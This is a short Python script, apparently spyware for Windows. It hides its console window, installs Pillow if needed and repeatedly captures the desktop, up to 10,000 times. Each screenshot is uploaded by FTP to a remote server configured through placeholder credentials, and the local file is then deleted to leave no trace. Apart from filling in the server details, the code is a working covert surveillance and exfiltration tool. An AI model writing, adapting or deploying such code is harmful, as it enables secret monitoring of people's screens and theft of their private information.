import os,os.path,ftplib,time,win32console,win32gui,sys

# hiding console screen 
win32gui.ShowWindow(win32console.GetConsoleWindow(),0)

try:
	from PIL import Image,ImageGrab
except:
	os.system("pip install Pillow")
finally:
	from PIL import Image,ImageGrab

# upload function
def upload(file,dirction,host,user,password):
	#connecting
	try:
		ftp=ftplib.FTP(host,user,password)
	except Exception as e:
		if e != " 530 You're already logged in" :
			print ("\n %s" % e)
			ftp.close() 
			exit()	
	#Uploading
	if os.path.exists(file)==True:
		ffile=open(file,"rb") 
		n="STOR "+str(file)
		ftp.storbinary(n,ffile)
		ffile.close()
		os.remove(file)
	else:
		exit()

# sceenshot fnction 
def scr():
	for count in range(10000) :
		name=str(time.strftime("%I-%M-%S %p"))+".jpg"
		img=ImageGrab.grab()
		Image.Image.save(img,name)
		#put ftp server info 
		upload(name,"remote dir","host","user","password")
		print (name)

scr()
